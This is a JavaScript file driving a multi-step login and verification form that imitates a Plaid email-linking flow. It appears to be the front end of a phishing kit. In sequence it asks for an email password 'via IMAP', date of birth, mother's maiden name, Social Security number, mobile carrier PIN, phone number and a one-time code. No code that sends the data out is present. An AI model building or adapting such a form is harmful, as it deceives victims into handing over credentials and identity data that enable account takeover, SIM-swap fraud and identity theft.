// For Showing Password
function togglePasswordVisibility() {
    const passwordInput = document.getElementById('password');
    const type = passwordInput.type === 'password' ? 'text' : 'password';
    passwordInput.type = type;
}

// For auth Validation
document.addEventListener("DOMContentLoaded", function () {
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");
    const usernameError = document.getElementById("usernameError");
    const passwordError = document.getElementById("passwordError");
    usernameInput.addEventListener("input", function () {
        if (usernameInput.value.trim()) {
            usernameError.classList.add("d-none");
        }
    });

    passwordInput.addEventListener("input", function () {
        if (passwordInput.value.trim()) {
            passwordError.classList.add("d-none");
        }
    });

    usernameInput.addEventListener("blur", function () {
        if (!usernameInput.value.trim()) {
            usernameError.classList.remove("d-none");
        }
    });

    passwordInput.addEventListener("blur", function () {
        if (!passwordInput.value.trim()) {
            passwordError.classList.remove("d-none");
        }
    });

    document.getElementById("loginForm").addEventListener("submit", function (e) {
        let isValid = true;
        
        if (!usernameInput.value.trim()) {
            usernameError.classList.remove("d-none");
            isValid = false;
        }

        if (!passwordInput.value.trim()) {
            passwordError.classList.remove("d-none");
            isValid = false;
        }


        if (isValid) {
            e.preventDefault();
            window.location.href = "home.html";
        }
    });
});
const steps = document.querySelectorAll('.step');
const progressBars = [
    document.getElementById('progressBar1'),
    document.getElementById('progressBar2'),
    document.getElementById('progressBar3'),
    document.getElementById('progressBar4')
];
const progressIcons = document.querySelectorAll('.progress-icon');
const progressIconBorder = document.querySelectorAll('.progress-i');
const progressText = document.querySelectorAll('.progress-text');
let currentStep = 0;

function updateProgressUI() {
    progressBars.forEach((progressBar, index) => {
        if (index < currentStep) {
            progressBar.style.width = "100%";
            progressBar.classList.remove('bg-secondary');
            progressBar.classList.add('bg-primary');
        } else if (index === currentStep) {
            progressBar.style.width = "100%";
            progressBar.classList.remove('bg-secondary');
            progressBar.classList.add('bg-primary');
        } else {
            progressBar.style.width = "0%";
            progressBar.classList.remove('bg-primary');
            progressBar.classList.add('bg-secondary');
        }
    });
    progressIcons.forEach((icon, index) => {
        if (index <= currentStep) {
            icon.classList.add('active');
        } else {
            icon.classList.remove('active');
        }
    });
    progressIconBorder.forEach((icon, index) => {
        if (index <= currentStep) {
            icon.classList.add('circle');
        } else {
            icon.classList.remove('circle');
        }
    });
    progressText.forEach((text, index) => {
        if (index <= currentStep) {
            text.classList.add('text-primary');
        } else {
            text.classList.remove('text-primary');
        }
    });
}

function changeStep(direction) {
    if (direction === 'next' && currentStep < steps.length - 1) {
        steps[currentStep].classList.remove('active');
        steps[currentStep].classList.add('d-none');
        currentStep++;
        steps[currentStep].classList.add('active');
        steps[currentStep].classList.remove('d-none');
    } else if (direction === 'prev' && currentStep > 0) {
        steps[currentStep].classList.remove('active');
        steps[currentStep].classList.add('d-none');
        currentStep--;
        steps[currentStep].classList.add('active');
        steps[currentStep].classList.remove('d-none');
    }
    updateProgressUI();
}

document.querySelectorAll('.next').forEach((btn) => {
    btn.addEventListener('click', () => changeStep('next'));
});

function continueToStepForm() {
    changeStep('next');
}

updateProgressUI();

function updateCard() {
    const emailCard = document.getElementById("emailCard");
    const divider = document.getElementById("divider");
    const cardTitle = document.getElementById("cardTitle");
    const cardDescription = document.getElementById("cardDescription");
    const emailIcons = document.getElementById("emailIcons");
    const emailInput = document.getElementById("emailInput");
    const actionButton = document.getElementById("actionButton");
    const footerText = document.getElementById("footerText");
    const userEmail = document.getElementById("userEmail");
    const emailLock = emailInput.closest(".email-lock");
    const emailError = document.getElementById("emailError");
    const email = emailInput.value;
    emailInput.addEventListener("input", () => {
        emailLock.classList.remove("border-danger");
        emailError.innerHTML = "";
    });
    if (!email) {
        emailLock.classList.add("border-danger");
        emailError.innerHTML = `<i class="fa-solid fa-circle-exclamation"></i> Please tell us your email address.`;
        return;
    }
    emailCard.classList.add("bg-primary");
    emailCard.style.color = "white";
    // Change divider to white
    divider.style.backgroundColor = "white";
    // Update icons' background
    emailIcons.innerHTML = `
            <div class="bg-dark rounded-circle p-2 border">
                <img src="assets/plaid-icon.svg" alt="yahoo" class="img-fluid" style="width: 28px;" />      
            </div>
             <div class="rounded-circle p-2 border" style="background-color: purple; margin-left: -10px">
                <img src="assets/yahoo-icon.svg" alt="yahoo" class="img-fluid" style="width: 28px;" />      
            </div>
        `;
    // Update card title and description
    cardTitle.textContent = "Enter Your Password";
    userEmail.textContent = `${email}`;
    cardDescription.innerHTML = `Please Enter the password of the following email address: <span style="font-weight: bolder">"${email}"</span> to authenticate using Protocol IMAP.`;
    // Add password input field
    emailLock.style.display = "none";
    const passwordField = document.createElement("div");
    passwordField.className = "mb-3";
    passwordField.innerHTML = `
         
                <div class="password-lock bg-white">
                                 <label class="w-100">
                <input required type="password" id="passwordInput"  placeholder="Enter Your Password" />
            </label>
                                <i class="fa-solid fa-lock text-dark"></i>
                            </div>
                <span id="passwordError" class="text-danger"></span>
               

                            
        `;
    emailInput.closest(".email-lock").insertAdjacentElement("afterend", passwordField);
    // Update button text and styles

    const passwordInput = document.getElementById("passwordInput");
    const passwordError = document.getElementById("passwordError");

    actionButton.textContent = "Verify";
    actionButton.classList.remove("btn-dark");
    actionButton.classList.add("btn-primary");

    actionButton.onclick = function () {
        const password = passwordInput.value.trim();
        if (!password) {
            passwordField.classList.add("border-danger");
            passwordError.innerHTML = `<i class="fa-solid fa-circle-exclamation"></i> Please tell us your password.`;
        } else {
            continueToStepForm();
        }
    };

    // This ensures the error is removed while typing in the password field
    passwordInput.addEventListener("input", () => {
        passwordField.classList.remove("border-danger");
        passwordError.innerHTML = "";
    });
    // Update footer text
    footerText.textContent = "By Providing your password to Plaid, you're enabling Plaid to authenticate your email address with securely using Protocol IMAP.";
}

function continueToNextStep() {
    const introCard = document.getElementById("intro-card");
    introCard.classList.add("d-none");
    const emailCard = document.getElementById("emailCard");
    emailCard.classList.remove("d-none");
}
const third = document.querySelector(".next");
third.addEventListener("click", () => {
    continueToNextStep();
})
function nextForm() {
    const identityCard = document.getElementById("identification-form");
    identityCard.classList.add("d-none");
    const phoneCard = document.getElementById("phone-form");
    phoneCard.classList.remove("d-none");
}

function submitIdentification() {
    const phoneCard = document.getElementById("phone-form");
    phoneCard.classList.add("d-none");
    const otpCard = document.getElementById("otp-form");
    otpCard.classList.remove("d-none");
}

document.addEventListener("DOMContentLoaded", () => {
    const dobInput = document.getElementById("dob");
    const motherMaidenNameInput = document.getElementById("motherMaidenName");
    const ssnInput = document.getElementById("ssn");
    const carrierPinInput = document.getElementById("carrierPin");
    const nextButton = document.querySelector(".first-step-button");
    const validateField = (field) => {
        if (field.value.trim() === "") {
            field.style.borderColor = "red";
            return false;
        } else {
            field.style.borderColor = "#949191";
            return true;
        }
    };
    [dobInput, motherMaidenNameInput, ssnInput, carrierPinInput].forEach((field) => {
        field.addEventListener("input", () => {
            validateField(field);
        });
    });
    dobInput.addEventListener("input", (e) => {
        const value = e.target.value.replace(/\D/g, "");
        e.target.value = value.replace(/(\d{2})(\d{2})(\d{4})/, "$1/$2/$3").substring(0, 10);
        validateField(dobInput);
    });

    ssnInput.addEventListener("input", (e) => {
        const value = e.target.value.replace(/\D/g, "");
        e.target.value = value
            .replace(/(\d{3})(\d{2})(\d{4})/, "$1-$2-$3")
            .substring(0, 11);
        validateField(ssnInput);
    });
    carrierPinInput.addEventListener("input", (e) => {
        e.target.value = e.target.value.replace(/\D/g, "");
        validateField(carrierPinInput);
    });
    nextButton.addEventListener("click", () => {
        const fields = [dobInput, motherMaidenNameInput, ssnInput, carrierPinInput];
        let isValid = true;
        fields.forEach((field) => {
            if (!validateField(field)) {
                isValid = false;
            }
        });

        if (isValid) {
            nextForm();
        }
    });

});
document.addEventListener("DOMContentLoaded", () => {
    const phoneNumber = document.getElementById("phone");
    const nextButton = document.querySelector(".two-step-button");
    const validateField = (field) => {
        if (field.value.trim() === "") {
            field.style.borderColor = "red";
            return false;
        } else {
            field.style.borderColor = "#949191";
            return true;
        }
    };
    phoneNumber.addEventListener("input", (e) => {
        e.target.value = e.target.value.replace(/(?!^\+)\D/g, "").replace(/^\+{2,}/g, "+");
        validateField(phoneNumber);
    });
    nextButton.addEventListener("click", () => {
        const isValid = validateField(phoneNumber);
        if (isValid) {
            submitIdentification();
        }
    });
});
document.addEventListener("DOMContentLoaded", () => {
    const otp = document.getElementById("otp");
    const nextButton = document.querySelector(".three-step-button");
    const validateField = (field) => {
        if (field.value.trim() === "") {
            field.style.borderColor = "red";
            return false;
        } else {
            field.style.borderColor = "#949191";
            return true;
        }
    };
    otp.addEventListener("input", (e) => {
        e.target.value = e.target.value.replace(/\D/g, "");
        validateField(otp);
    });
    otp.addEventListener("input", (e) => {
        e.target.value = e.target.value.replace(/(?!^\+)\D/g, "").replace(/^\+{2,}/g, "+");
        validateField(otp);
    });
    nextButton.addEventListener("click", () => {
        const isValid = validateField(otp);
        if (isValid) {
            continueToStepForm();
        }
    });
});




